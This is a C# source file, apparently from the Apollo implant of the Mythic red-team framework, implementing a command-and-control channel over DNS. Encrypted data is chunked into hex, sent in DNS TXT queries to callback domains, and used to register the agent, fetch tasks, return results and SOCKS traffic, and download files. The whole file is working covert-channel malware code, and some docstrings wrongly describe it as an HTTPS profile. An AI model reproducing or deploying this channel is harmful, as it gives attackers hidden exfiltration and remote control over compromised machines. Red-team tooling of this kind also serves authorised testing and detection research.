#define C2PROFILE_NAME_UPPER

#if DEBUG
#undef HTTP
#define HTTP
#endif


#undef USE_HTTPWEB
#define USE_HTTPWEB

using System.Net.NetworkInformation;
using System.Net.Sockets;
using System;
using System.Linq;
using System.Text;
using Mythic.C2Profiles;
using Mythic.Crypto;
using Apollo.CommandModules;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Diagnostics;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using System.Collections.Generic;
using Mythic.Structs;
using Apollo.MessageInbox;
using static Utils.DebugUtils;
using Apollo.Tasks;
using System.Drawing.Printing;
using Mythic;
using Mythic.Encryption;
using System.Threading;

namespace Mythic.C2Profiles
{

    /// <summary>
    /// This is the default profile implemented by the Apfell server. This is a simple
    /// HTTPS egress communications profile that has a hard-coded endpoint specified by
    /// the Endpoint attribute. This string is stamped in by the Apfell server (ideally)
    /// at generation, but it's not too hard to implement as a constructor should that
    /// need arise.
    /// </summary>
    class DNSProfile : ReverseConnectC2Profile
    {
        private int server_turn = 2;
        private int agent_turn = 1;
        private int message_count_turn = 3;
        private int reset_turn = 4;
        private string cache_code = "";
        private string cached_message_server = "";
        private string cached_message_client = "";
        private const string sCallbackInterval = "callback_interval";
        private const string sCallbackJitter = "callback_jitter";
        private const string sEncryptedExchangeCheck = "encrypted_exchange_check";
        private const string TerminateDate = "killdate";
        private object lockerSend = new Object();
        private object lockerErrorCount = new Object();

	public object lockerDnsMsg = new Object();
        private const string sCallbackDomainsList = "callback_domains";
        private const string sInitializationMessagePrefix = "msginit";
        private const string sDefaultMessagePrefix = "msgdefault";
        private const string sHmacKey = "hmac_key";

        Dictionary<int,Thread> threads_msg = new Dictionary<int,Thread>();
        Dictionary<int, string> dns_msg = new Dictionary<int, string>();

	public volatile bool is_fallback = false;
	public volatile int error_count_p1 = 0;
	public volatile int error_count_p2 = 0;
	private int MAX_ERROR_TOLERANCE_1 = 50;
	private int MAX_ERROR_TOLERANCE_2 = 25;
        private volatile int max_threads_conn = 10;
        int[] next_msg_queue;
        Thread next_msg_organizer;

        private bool is_init = false;
        private bool finished_sending = false;
        private int message_count = 0;

        List<string> domains;
        private volatile int bit_flip = 0;
        DnsRip.Resolver dnsRip;
        private int channel;
        private int init_seq;
        private volatile int next_seq;
        private int end_seq;

        private bool EncryptedExchangeCheck;

        List<SocksDatagram> finalSocksDatagrams = new List<SocksDatagram>();

        //public static DefaultEncryption cryptor;

        // Almost certainly need to pass arguments here to deal with proxy nonsense.
        /// <summary>
        /// Default constructor that will implement the default PSK encryption routine
        /// given by the Apfell server at payload compile time. The UUID and PSK are set
        /// by the server in the Globals.cs file. In the future, this constructor may want
        /// to take variable arguments such as:
        /// - Endpoint
        /// - Headers
        /// - etc.
        /// </summary>
        public DNSProfile(string uuid = "UUID_HERE", string psk = "AESPSK")
        {
            CallbackInterval = int.Parse(sCallbackInterval) * 1000;
            CallbackJitter = int.Parse(sCallbackJitter);
            EncryptedExchangeCheck = sEncryptedExchangeCheck == "T";
            base.cryptor = new PSKCrypto(uuid, psk);
            // Necessary to disable certificate validation
            domains = sCallbackDomainsList.Split(',').ToList();
	    this.next_msg_queue = new int[this.max_threads_conn];
            dnsRip = new DnsRip.Resolver(GetDnsAddress());
            reset_init_all();
        }

	public void reset_init_all()
        {
	    this.error_count_p1 = 0;
	    this.error_count_p2 = 0;
            this.finished_sending = false;
	    this.bit_flip = 0;
            this.is_init = false;
            this.cached_message_server = "";
            this.cached_message_client = "";
            channel = initialize_ch_seq();
            init_seq = initialize_ch_seq();
	    this.dns_msg.Clear();
	    initialize_Channel_conn();

        }

	public void set_error()
	{
	    lock(lockerErrorCount)
	    {
                if(this.is_fallback == false)
		{
	            this.error_count_p1 += 1;
		}else{
		    this.error_count_p2 += 1;
		}
	    }

	}

	public void reset_error_count()
	{
	    lock(lockerErrorCount){
	        this.error_count_p1 = 0;
	        this.error_count_p2 = 0;
	        this.is_fallback = false;
	        this.max_threads_conn = 10;
	    }
	}

	public void set_fallback()
	{
	    this.max_threads_conn = 1;
	    this.is_fallback = true;

	}

	public void check_fallback()
	{
	    if(this.is_fallback == true)
	    {
	        Thread.Sleep(this.CallbackInterval);
	    }
	}


        //message pattern:
        //mesg    : _______.___________.________.________.__________
        //          PREFIX SID  +    SEQ BYTES   HMAC       DOMAIN
        //hmac = (md5) 32
        // seq + sid = 8
        //prefix = ~
        //domain = ~

        public string GetDnsAddress()
        {
            while (true)
            {
                NetworkInterface[] networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();

                foreach (NetworkInterface networkInterface in networkInterfaces)
                {
                    if (networkInterface.OperationalStatus == OperationalStatus.Up)
                    {
                        IPInterfaceProperties ipProperties = networkInterface.GetIPProperties();
                        IPAddressCollection dnsAddresses = ipProperties.DnsAddresses;

                        foreach (IPAddress dnsAdress in dnsAddresses)
                        {
                            if (dnsAdress.AddressFamily == AddressFamily.InterNetwork)
                            {
                                return dnsAdress.ToString();
                            }

                        }
                    }
                }
                Thread.Sleep(this.CallbackInterval);
            }
        }

        public int initialize_ch_seq()
        {
            Random rd_ch = new Random();
            return rd_ch.Next(0, 200);
        }

        public void initialize_Channel_conn()
        {
            while (is_init == false)
            {

                send_init_request();
		Thread.Sleep(this.CallbackInterval);
            }
        }

        public string get_random_domain_query()
        {
            var random = new Random();
            int index = random.Next(domains.Count);
            return domains[index];
        }

        public Dictionary<string,string> parse_message(string message)
        {

            string[] fields = message.Split('.');
            Dictionary<string, string> dFields = new Dictionary<string, string>();
            dFields["tsid"] = fields[0];
            dFields["bit_flip"] = fields[1];
            dFields["data"] = fields[2];

            return dFields;
        }

        public bool send_reset_request()
        {

            int maximum_size_messages = 63;
            string random_message = GenerateUniqueHexString(maximum_size_messages);
            string hex_channel = String.Format("{0:X2}", this.channel);
            string hex_seq = String.Format("{0:X6}", this.init_seq);

            var tsid = hex_channel + this.bit_flip + hex_seq;
            var data = Encoding.UTF8.GetBytes(tsid+random_message);
            var key = Encoding.UTF8.GetBytes(sHmacKey);
            var hmac = new HMACMD5(key);
            var hashBytes = hmac.ComputeHash(data);
            string hmac_section = System.BitConverter.ToString(hashBytes).Replace("-", "").ToLower();


            string message = sDefaultMessagePrefix + "." + tsid + "." + random_message + "." + hmac_section + "." + get_random_domain_query();


            string result = "";
            try
            {
                result = dnsRip.Resolve(message, DnsRip.QueryType.TXT).First().Record.Replace("\"", "");
            }
            catch (Exception ex)
            {
		set_error();
		result = "";

                return false;
            }

            try
            {
                if (!string.IsNullOrEmpty(result))
                {
                    Dictionary<string, string> dFields = parse_message(result);
                    int channel = int.Parse(dFields["tsid"].Substring(0, 2), System.Globalization.NumberStyles.HexNumber);
                    int seq = int.Parse(dFields["tsid"].Substring(2, 6), System.Globalization.NumberStyles.HexNumber);

                    if (channel != this.channel)
                    {
                        this.channel = channel;

                    }

                    this.bit_flip = this.agent_turn;
                    this.next_seq = seq;
                    this.init_seq = seq;
                    this.dns_msg.Clear();

		    reset_error_count();
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch (Exception ex)
            {
                result = "";
                return false;
            }
        }

        public void reset_cycle()
        {
            while (true){
		check_fallback();
                if(send_reset_request() == true)
                {
                    break;
                }
		if (this.error_count_p2 >= this.MAX_ERROR_TOLERANCE_2)
                {
                    throw new Exception("Fallback");
                }
		if (this.error_count_p1 >= this.MAX_ERROR_TOLERANCE_1)
		{
		    set_fallback();
		}
            }

        }

        public void send_init_request()
        {
            int maximum_size_messages = 63;
            string random_message = GenerateUniqueHexString(maximum_size_messages);
            this.cache_code = random_message;
            string hex_channel = String.Format("{0:X2}", channel);
            string hex_seq = String.Format("{0:X6}", init_seq);

            var tsid = hex_channel +this.bit_flip+ hex_seq;
            var data = Encoding.UTF8.GetBytes(tsid+random_message);
            var key = Encoding.UTF8.GetBytes(sHmacKey);
            var hmac = new HMACMD5(key);
            var hashBytes = hmac.ComputeHash(data);
            string hmac_section = System.BitConverter.ToString(hashBytes).Replace("-", "").ToLower();

            string message = sInitializationMessagePrefix + "." + tsid + "."+random_message+"." + hmac_section +"." + get_random_domain_query();

            string result = "";
            try
            {
                result = dnsRip.Resolve(message, DnsRip.QueryType.TXT).First().Record.Replace("\"", "");
            }catch(Exception ex)
            {
                result = "";
            }
            try
            {
                if (!string.IsNullOrEmpty(result))
                {
                    Dictionary<string, string> dFields = parse_message(result);
                    int channel = int.Parse(dFields["tsid"].Substring(0, 2), System.Globalization.NumberStyles.HexNumber);
                    int seq = int.Parse(dFields["tsid"].Substring(2, 6), System.Globalization.NumberStyles.HexNumber);

                    if (channel != this.channel)
                    {
                        this.channel = channel;

                    }


                    this.is_init = true;
                    this.bit_flip = this.agent_turn;
                    this.next_seq = seq;
                    this.init_seq = seq;
                }
            }
            catch (Exception ex)
            {
                result = "";
            }
        }


        public int get_maximum_size_dns(string prefix, string domain)
        {
            return (255 - prefix.Length - domain.Length - 32 - 8);
        }

        public List<string> SplitByLength(string str, int maxLength)
        {
            List<string> parts = new List<string>();
            for (int index = 0; index < str.Length; index += maxLength)
            {
                parts.Add(str.Substring(index, Math.Min(maxLength, str.Length - index)));
            }
            return parts;
        }


        public void setup_message_list(string message, string domain, bool is_cache)
        {
        IEnumerable<string> dns_msg_arr;
            //int maximum_size_messages = get_maximum_size_dns(sDefaultMessagePrefix, domain);
            int maximum_size_messages = 63;
            if(is_cache == false){
                byte[] ba_str = Encoding.Default.GetBytes(message);
                var hexString = BitConverter.ToString(ba_str);
                hexString = hexString.Replace("-", "");
                dns_msg_arr = this.SplitByLength(hexString, maximum_size_messages);
            }else{
                dns_msg_arr = this.SplitByLength(message, maximum_size_messages);
            }
            int index = 0;
            foreach (var msg_chunk in dns_msg_arr)
            {
                this.dns_msg[index] = msg_chunk;
                index = index + 1;
            }
            this.end_seq = this.next_seq + this.dns_msg.Count;
            this.bit_flip = this.agent_turn;
        }

        public void add_packet(int seq, string packet)
        {
	    lock(lockerDnsMsg){

                int packet_pos = seq - this.init_seq;
                this.dns_msg[packet_pos] = packet;

                if (this.dns_msg.Count == this.message_count)
                {
                    this.bit_flip = this.reset_turn;
                }
	    }
        }

        //send dns query using thread
        //mesg    : _______.___________.________.________.__________
        //          PREFIX SID  +    SEQ BYTES   HMAC       DOMAIN
        public void dnsquery(int seq, string domain,bool is_cache)
        {
            string result = "";
            try
            {
                string message;
                if (this.bit_flip == this.agent_turn)
                {
                    if (this.dns_msg.ContainsKey(seq - this.init_seq) && is_cache == false)
                    {
                        message = this.dns_msg[seq - this.init_seq];
                    }
                    else
                    {
                        if(is_cache == true)
                        {
                            message = this.dns_msg[0];
                        }else{
                            return;
                        }
                    }
                }
                else
                {
                    int maximum_size_messages = 63;
                    message = GenerateUniqueHexString(maximum_size_messages);
                }
                try
                {
                    string hex_channel = String.Format("{0:X2}", this.channel);
                    string hex_seq = String.Format("{0:X6}", seq);

                    var tsid = hex_channel + this.bit_flip+ hex_seq;
                    var data = Encoding.UTF8.GetBytes(tsid+message);
                    var key = Encoding.UTF8.GetBytes(sHmacKey);
                    var hmac = new HMACMD5(key);
                    var hashBytes = hmac.ComputeHash(data);
                    string hmac_section = System.BitConverter.ToString(hashBytes).Replace("-", "").ToLower();

                    string data_query = sDefaultMessagePrefix + "." + tsid + "." + message +"."+  hmac_section+ "."+domain;
                    result = "";

                    result = dnsRip.Resolve(data_query, DnsRip.QueryType.TXT).First().Record.Replace("\"", "");
                }
                catch (Exception ex)
                {
                    result = null;
                }
                if (!string.IsNullOrEmpty(result))
                {

                    try
                    {
                        Dictionary<string, string> dFields = parse_message(result);
			int resp_bit_flip = Int32.Parse(dFields["bit_flip"]);
		        if (resp_bit_flip == this.message_count_turn){
			    this.bit_flip = this.message_count_turn;
			    return;
			}
                        if (resp_bit_flip == this.agent_turn || resp_bit_flip == this.server_turn)
                        {
                            int channel = int.Parse(dFields["tsid"].Substring(0, 2), System.Globalization.NumberStyles.HexNumber);
                            int seq_resp = int.Parse(dFields["tsid"].Substring(2, 6), System.Globalization.NumberStyles.HexNumber);

                            if (this.bit_flip == this.agent_turn)
                            {
                                if (this.next_seq < seq_resp)
                                {
                                    this.next_seq = seq_resp;
                                }
                                if (seq_resp >= this.end_seq)
                                {
                                    this.bit_flip = this.message_count_turn;
                                }
                                if (is_cache == true)
                                {
                                    this.bit_flip = this.message_count_turn;
                                    this.next_seq = this.end_seq;
                                }
                            }
                            else
                            {
                                if (Int32.Parse(dFields["bit_flip"]) == 2)
                                {
                                    if (dFields.ContainsKey("data") && !string.IsNullOrEmpty(dFields["data"]))
                                    {
                                        add_packet(seq_resp, dFields["data"]);
                                    }
                                }else{
				    if (Int32.Parse(dFields["bit_flip"]) == 4){
				        this.bit_flip = this.reset_turn;
				    }
				}

                            }
                        }
			reset_error_count();
                    }
                    catch (Exception ex)
                    {
                        result = "";
                    }
                }else{
		    set_error();
		}
            }
            catch (Exception ex)
            {
            }
        }

        public void setup_thread_reqs(int seq,string domain,bool is_cache)
        {
            if (this.bit_flip == this.agent_turn)
            {
                if (is_cache == true)
                {
                    dnsquery(seq, domain,is_cache);
                }else{
                    for (int i = 0; i < this.max_threads_conn && seq + i < this.end_seq && this.bit_flip == this.agent_turn; i++)
                    {
                        check_fallback();
                        Thread dnsthread = new Thread(() => dnsquery(seq + i, domain,is_cache));
                        dnsthread.Start();
                        threads_msg[i] = dnsthread;
                    }
		    for (int i = 0; i < max_threads_conn;i++)
                    {
                        threads_msg[i].Join();
                    }
                }
            }
            else
            {
                try
                {
                    for (int i = 0; i < this.next_msg_queue.Length && i < this.message_count && i<this.max_threads_conn; i++)
                    {
                        check_fallback();
                        int new_start = seq + this.next_msg_queue[i];
                        Thread dnsthread = new Thread(() => dnsquery(new_start, domain,is_cache));
                        dnsthread.Start();
                        threads_msg[i] = dnsthread;
                    }
                    for (int i = 0; i < max_threads_conn;i++)
                    {
                        threads_msg[i].Join();
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }

        public void send_dns_data(string domain, bool is_cache)
        {
            while (this.bit_flip == this.agent_turn)
            {
		if (this.error_count_p2 >= this.MAX_ERROR_TOLERANCE_2)
                {
                    throw new Exception("Fallback");
                }
		if (this.error_count_p1 >= this.MAX_ERROR_TOLERANCE_1)
                {
                    set_fallback();
                }
                int starting_point = this.next_seq;
                setup_thread_reqs(starting_point,domain,is_cache);
            }
        }
        public string GenerateUniqueHexString(int length)
        {
            string StringChars = "0123456789abcdef";
            Random rand = new Random();
            var charList = StringChars.ToArray();
            string hexString = "";

            for (int i = 0; i < length; i++)
            {
                int randIndex = rand.Next(0, charList.Length);
                hexString += charList[randIndex];
            }

            return hexString;
        }

        public void set_message_count(string domain)
        {
            while (this.bit_flip == this.message_count_turn)
            {
		check_fallback();
                //int maximum_size_messages = get_maximum_size_dns(sDefaultMessagePrefix, domain);
                string result = "";
                try
                {
                    int maximum_size_messages = 63;
                    string random_message = GenerateUniqueHexString(maximum_size_messages);

                    string hex_channel = String.Format("{0:X2}", channel);
                    string hex_seq = String.Format("{0:X6}", this.next_seq);

                    var tsid = hex_channel +this.bit_flip+ hex_seq;
                    var data = Encoding.UTF8.GetBytes(tsid + random_message);
                    var key = Encoding.UTF8.GetBytes(sHmacKey);
                    var hmac = new HMACMD5(key);
                    var hashBytes = hmac.ComputeHash(data);
                    string hmac_section = System.BitConverter.ToString(hashBytes).Replace("-", "").ToLower();

                    string data_query = sDefaultMessagePrefix + "." + tsid + "." + random_message + "." + hmac_section + "." + domain;

                    result = dnsRip.Resolve(data_query, DnsRip.QueryType.TXT).First().Record.Replace("\"", "");
                }
                catch (Exception ex)
                {
                }
                //setup next x threads ( x = max_threads_conn)
                //
                if (!string.IsNullOrEmpty(result))
                {
                    Dictionary<string, string> dFields = parse_message(result);
                    int channel = int.Parse(dFields["tsid"].Substring(0, 2), System.Globalization.NumberStyles.HexNumber);
                    int seq_resp = int.Parse(dFields["tsid"].Substring(2, 6), System.Globalization.NumberStyles.HexNumber);

                    this.init_seq = seq_resp;
                    this.next_seq = 0;
                    this.message_count = int.Parse(dFields["data"], System.Globalization.NumberStyles.HexNumber);
                    this.bit_flip = this.server_turn;
                    this.end_seq = seq_resp + this.message_count;
                    this.dns_msg.Clear();
		    reset_error_count();
                }
		else{
		    set_error();
		    if (this.error_count_p2 >= this.MAX_ERROR_TOLERANCE_2)
                    {
                        throw new Exception("Fallback");
                    }
		    if (this.error_count_p1 >= this.MAX_ERROR_TOLERANCE_1)
                    {
                        set_fallback();
                    }
		}
            }
        }

        public void message_organizer()
        {
            //while (this.bit_flip == this.server_turn)
            //{
                //keep walking in the packets dictionary
                //until there is a gap
                //fill the next msg queue with the gap considering the maximum count of threads
                while (this.dns_msg.ContainsKey(this.next_seq) && this.next_seq < this.message_count)
                {
                this.next_seq = this.next_seq + 1;
                }

                for (int i = 0; i < max_threads_conn && this.bit_flip == this.server_turn; i++)
                {
                    if ((this.next_seq + i)< this.message_count)
                    {
                        this.next_msg_queue[i] = this.next_seq + i;
                    }
                    else
                    {
                        this.next_msg_queue[i] = this.next_seq;
                    }

                }
            //}
        }

        public void init_next_msg_queue()
        {
            for(int i = 0; i<next_msg_queue.Length; i++)
            {
                next_msg_queue[i] = i;
            }
        }

        public string get_dns_data(string domain,bool is_cache)
	{
            this.bit_flip = this.server_turn;
	    init_next_msg_queue();
            //Thread msgorganizer_thread = new Thread(() => message_organizer());
            //msgorganizer_thread.Start();
            int starting_point = this.init_seq;
            while (this.bit_flip == this.server_turn)
            {
                //setup next x threads ( x = max_threads_conn)
                //
		if (this.error_count_p2 >= this.MAX_ERROR_TOLERANCE_2)
                {
                    throw new Exception("Fallback");
                }
		if (this.error_count_p1 >= this.MAX_ERROR_TOLERANCE_1)
                {
                    set_fallback();
                }
                try
                {
                    setup_thread_reqs(starting_point, domain,is_cache);
                }
                catch (Exception ex)
                {
                }
                message_organizer();
            }
            return build_message();
        }

        public static string HextoString(string InputText)
        {

            byte[] bb = Enumerable.Range(0, InputText.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(InputText.Substring(x, 2), 16))
                             .ToArray();
            return System.Text.Encoding.ASCII.GetString(bb);
        }

        public string build_message()
        {
            string full_msg = "";
            for(int i = 0; i < this.message_count; i++)
            {
                full_msg = full_msg + this.dns_msg[i];
            }
            if (full_msg == this.cache_code)
            {
                return full_msg;
            }
            full_msg = HextoString(full_msg);
            return full_msg;
        }

        // Encrypt and post a string to the Apfell server
        /// <summary>
        /// Send a POST request to the Apfell server given a JSON message
        /// and return the JSON string as the result.
        /// </summary>
        /// <param name="message">JSON message string to send.</param>
        /// <returns>JSON string of the server result.</returns>
        public override bool Send(string id, string message)
        {
            Stopwatch sw = new Stopwatch();
            sw.Start();
            string payload = "";
            bool is_cache = false;
            if (message == this.cached_message_client){
                is_cache = true;
                payload = cache_code;
            }else{
                this.cached_message_client = message;
                payload = base.cryptor.Encrypt(message);
            }
            //DebugWriteLine($"Waiting for egress mutex handle...");
            //DebugWriteLine($"Acquired egress mutex handle!");
            string result;
            int busyCount = 0;
            string domain = get_random_domain_query();
            setup_message_list(payload, domain,is_cache);
            while (true)
            {
                try
                {
                    send_dns_data(domain,is_cache);
                    set_message_count(domain);
                    string enc_message = get_dns_data(domain,is_cache);//sent dns data, start receiving response
                    if (enc_message == this.cache_code){
                        result = this.cached_message_server;
                    }else{
                        result = base.cryptor.Decrypt(enc_message);
                        this.cached_message_server = result;
                    }
                    reset_cycle();
                    sw.Restart();
                    Inbox.AddMessage(id, result);
                    sw.Stop();
                    DebugWriteLine($"Took {Utils.StringUtils.FormatTimespan(sw.Elapsed)} to add message to inbox.");
                    break;
                }

                catch (Exception ex)
                {
		    if (this.error_count_p2 >= this.MAX_ERROR_TOLERANCE_2){
		        reset_init_all();
	            }
                    DebugWriteLine($"Error sending message. Reason: {ex.Message}\n\tStackTrace:{ex.StackTrace}");
                    return false;
                }
            }
            //DebugWriteLine("Releasing egress mutex handle...");
            return true;
        }

        /// <summary>
        /// Serialize an arbitrary task response message
        /// and send it to the Apfell server. Return the
        /// JSON string if successful, otherwise return the
        /// error message or null.
        /// </summary>
        /// <param name="taskresp">Arbitrary object to send in the responses variable.</param>
        /// <returns>Result string</returns>
        override public string SendResponse(string id, Apollo.Tasks.ApolloTaskResponse taskresp)
        {
            try // Try block for HTTP requests
            {
                // Encrypt json to send to server
                Mythic.Structs.TaskResponse apfellResponse = new Mythic.Structs.TaskResponse
                {
                    action = "post_response",
                    responses = new Apollo.Tasks.ApolloTaskResponse[] { taskresp },
                    delegates = new Dictionary<string, string>[] { },
                };
                //Dictionary<string, string>[] delegateMessages = new Dictionary<string, string>[] { };
                if (DelegateMessageRequestQueue.Count > 0)
                {
                    DelegateMessageRequestMutex.WaitOne();
                    apfellResponse.delegates = DelegateMessageRequestQueue.ToArray();
                    DelegateMessageRequestQueue.Clear();
                    DelegateMessageRequestMutex.ReleaseMutex();
                }
                string json = JsonConvert.SerializeObject(apfellResponse);
                //string id = Guid.NewGuid().ToString();
                bool send_res = false;
                lock (lockerSend)
                {
                    send_res = Send(id, json);
                }
                if (send_res)
                {
                    string result = (string)Inbox.GetMessage(id);
                    if (result.Contains("success"))
                        // If it was successful, return the result
                        return result;
                }
                //Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.task}: {result}");
                //throw (new Exception($"POST Task Response {taskresp.task} Failed"));
            }
            catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
            {
                return e.Message;
            }
            return "";
        }

        override public string SendResponses(string id, Apollo.Tasks.ApolloTaskResponse[] resps, SocksDatagram[] datagrams = null)
        {
            try // Try block for HTTP requests
            {
                // Encrypt json to send to server
                /*
             * //Utils.DebugUtils.DebugWriteLine("Attempting to get all messages from Queue...");
                SocksDatagram[] datagrams = Apollo.SocksProxy.SocksController.GetMythicMessagesFromQueue();
                //Utils.DebugUtils.DebugWriteLine("Got all messages from Queue!");
                bool bRet = false;
                if (datagrams.Length == 0)
                {
                    return true;
                }
                try // Try block for HTTP requests
                {
                    // Encrypt json to send to server
                    string msgId = $"{Guid.NewGuid().ToString()}";
                    Mythic.Structs.TaskResponse apfellResponse = new Mythic.Structs.TaskResponse
                    {
                        action = "post_response",
                        responses = new Apollo.Tasks.ApolloTaskResponse[] { },
                        delegates = new Dictionary<string, string>[] { },
                        socks = datagrams,
                        message_id = msgId
                    };
                    string json = JsonConvert.SerializeObject(apfellResponse);
                    if (Send(msgId, json))
                    {
                        string result = (string)Inbox.GetMessage(msgId);
                        //Utils.DebugUtils.DebugWriteLine("Got the response to sending datagrams!");
                        bRet = true;
                        //if (result.Contains("success"))
                        //    // If it was successful, return the result
                        //    bRet = true;
                    }
                    //Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.task}: {result}");
                    //throw (new Exception($"POST Task Response {taskresp.task} Failed"));
                }
                catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
                {
                    bRet = false;
                }
                return bRet;*/

                Mythic.Structs.TaskResponse apfellResponse = new Mythic.Structs.TaskResponse
                {
                    action = "post_response",
                    responses = resps,
                    delegates = new Dictionary<string, string>[] { },
                    socks = datagrams
                };
                if (DelegateMessageRequestQueue.Count > 0)
                {
                    lock (DelegateMessageRequestQueue)
                    {
                        apfellResponse.delegates = DelegateMessageRequestQueue.ToArray();
                        DelegateMessageRequestQueue.Clear();
                    }
                }
                string json = JsonConvert.SerializeObject(apfellResponse);
                //string id = Guid.NewGuid().ToString();
                bool send_res = false;
                lock (lockerSend)
                {
                    send_res = Send(id, json);
                }
                if (send_res)
                {
                    string result = (string)Inbox.GetMessage(id);
                    if (result.Contains("success"))
                        // If it was successful, return the result
                        return result;
                }
                //Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.task}: {result}");
                //throw (new Exception($"POST Task Response {taskresp.task} Failed"));
            }
            catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
            {
                return e.Message;
            }
            return "";
        }



        /// <summary>
        /// Register the agent with the Apfell server.
        /// </summary>
        /// <param name="agent">The agent to register with the server.</param>
        /// <returns>UUID of the newly registered agent.</returns>
        override public string RegisterAgent(Apollo.Agent agent)
        {
            // Get JSON string for implant
            DebugWriteLine("Attempting to serialize agent...");
            string json = JsonConvert.SerializeObject(agent);
            DebugWriteLine($"[+] InitializeImplant - Sending {json}");
            string id = Guid.NewGuid().ToString();
            bool send_res = false;
            lock (lockerSend)
            {
                send_res = Send(id, json);
            }
            if (send_res)
            {
                DebugWriteLine("Successfuly sent registration message!");
                string result = (string)Inbox.GetMessage(id);
                if (result.Contains("success"))
                {
                    // If it was successful, initialize implant
                    // Response is { "status": "success", "id": <id> }
                    JObject resultJSON = (JObject)JsonConvert.DeserializeObject(result);
                    string newUUID = resultJSON.Value<string>("id");
                    cryptor.UpdateUUID(newUUID);
                    return newUUID;
                }
                else
                {
                    throw (new Exception("Failed to retrieve an ID for new callback."));
                }
            }
            return "";
        }

        /// <summary>
        /// Check Apfell endpoint for new task
        /// </summary>
        /// <returns>CaramelTask with the next task to execute</returns>
        override public Mythic.Structs.TaskQueue GetMessages(Apollo.Agent agent)
        {
            Stopwatch sw = new Stopwatch();
            sw.Start();
            //DebugWriteLine("Attempting to send SOCKS datagrams...");
            //SendSocksDatagrams();
            sw.Stop();
            DebugWriteLine($"SendSocksDatagrams took {Utils.StringUtils.FormatTimespan(sw.Elapsed)} to run.");
            sw.Restart();
            //DebugWriteLine("Sent all SOCKS datagrams!");
            TaskQueue response = new TaskQueue();
            List<Task> finalTaskList = new List<Task>();
            List<DelegateMessage> finalDelegateMessageList = new List<DelegateMessage>();
            CheckTaskingRequest req = new CheckTaskingRequest()
            {
                action = "get_tasking",
                tasking_size = -1
            };
            if (DelegateMessageRequestQueue.Count > 0)
            {
                DelegateMessageRequestMutex.WaitOne();
                req.delegates = DelegateMessageRequestQueue.ToArray();
                DelegateMessageRequestQueue.Clear();
                DelegateMessageRequestMutex.ReleaseMutex();
            }
            else
            {
                req.delegates = new Dictionary<string, string>[] { };
            }
            // Could add delegate post messages
            string json = JsonConvert.SerializeObject(req);
            string id = Guid.NewGuid().ToString();
            bool send_res = false;
            lock (lockerSend)
            {
                send_res = Send(id, json);
            }
            if (send_res)
            {
                string returnMsg = (string)Inbox.GetMessage(id);
                //JObject test = (JObject)JsonConvert.DeserializeObject(returnMsg);
                ////Dictionary<string, object>[] testDictTasks = test.Value<Dictionary<string, object>[]>("tasks");
                //Task[] testTasks = test.Value<Task[]>("tasks");
                Mythic.Structs.CheckTaskingResponse resp = JsonConvert.DeserializeObject<Mythic.Structs.CheckTaskingResponse>(returnMsg);
                if (resp.tasks != null)
                {
                    foreach (Task task in resp.tasks)
                    {
                        Debug.WriteLine("[-] CheckTasking - NEW TASK with ID: " + task.id);
                        finalTaskList.Add(task);
                    }
                }
                if (resp.delegates != null)
                {
                    foreach (Dictionary<string, string> delmsg in resp.delegates)
                    {
                        string uuid = delmsg.Keys.First();
                        finalDelegateMessageList.Add(new DelegateMessage()
                        {
                            UUID = uuid,
                            Message = delmsg[uuid]
                        });
                    }
                }
                if (resp.socks != null)
                {
                    response.SocksDatagrams = resp.socks;
                }
            }
            response.Delegates = finalDelegateMessageList.ToArray();
            response.Tasks = finalTaskList.ToArray();
            sw.Stop();
            DebugWriteLine($"Get tasking took {Utils.StringUtils.FormatTimespan(sw.Elapsed)} to run.");
            //SCTask task = JsonConvert.DeserializeObject<SCTask>(Post(json));
            return response;
        }



        override public byte[] GetFile(UploadFileRegistrationMessage fileReg, int chunk_size)
        {
            string response;
            UploadReply reply;
            reply.total_chunks = 0;
            byte[] data;
            List<byte> fileChunks = new List<byte>();
            int i = 1;
            // Set requisite attributes
            fileReg.action = "upload";
            fileReg.chunk_size = chunk_size;
            //fileReg.chunk_num = i;
            if (fileReg.full_path != "" && fileReg.full_path != null && (fileReg.task_id == "" || fileReg.task_id == null))
                throw new Exception("Full path given but no task_id set. Aborting.");
            try
            {
                do
                {
                    fileReg.chunk_num = i;
                    bool send_res = false;
                    lock (lockerSend)
                    {
                        send_res = Send(fileReg.task_id, JsonConvert.SerializeObject(fileReg));
                    }
                    if (send_res)
                    {
                        response = (string)Inbox.GetMessage(fileReg.task_id);
                        reply = JsonConvert.DeserializeObject<UploadReply>(response);
                        data = System.Convert.FromBase64String(reply.chunk_data);
                        for (int j = 0; j < data.Length; j++)
                        {
                            fileChunks.Add(data[j]);
                        }
                        i++;
                    }
                } while (i <= reply.total_chunks);
            }
            catch (Exception ex)
            {
                return null;
            }
            return fileChunks.ToArray();
        }

        /// <summary>
        /// Retrieve a file from the Apfell server and return the bytes of that file.
        /// </summary>
        /// <param name="file_id">ID of the file to pull down.</param>
        /// <param name="implant">Agent or implant that is retrieving this file.</param>
        /// <returns></returns>
        override public byte[] GetFile(string task_id, string file_id, int chunk_size)
        {
            List<byte> fileChunks = new List<byte>();
            try
            {
                Mythic.Structs.UploadFileRegistrationMessage fileReg;
                string response;
                UploadReply reply;
                byte[] data;
                int i = 1;
                do
                {
                    fileReg = new UploadFileRegistrationMessage()
                    {
                        action = "upload",
                        chunk_size = chunk_size,
                        file_id = file_id,
                        full_path = "",
                        chunk_num = i
                    };
                    bool send_res = false;
                    lock (lockerSend)
                    {
                        send_res = Send(task_id, JsonConvert.SerializeObject(fileReg));
                    }
                    if (send_res)
                    {
                        response = (string)Inbox.GetMessage(task_id);
                        reply = JsonConvert.DeserializeObject<UploadReply>(response);
                        data = System.Convert.FromBase64String(reply.chunk_data);
                        for (int j = 0; j < data.Length; j++)
                        {
                            fileChunks.Add(data[j]);
                        }
                        i++;
                    }
                    else
                    {
                        break;
                    }
                } while (i <= reply.total_chunks);
            }
            catch
            {
                return null;
            }
            return fileChunks.ToArray();
        }
    }
}

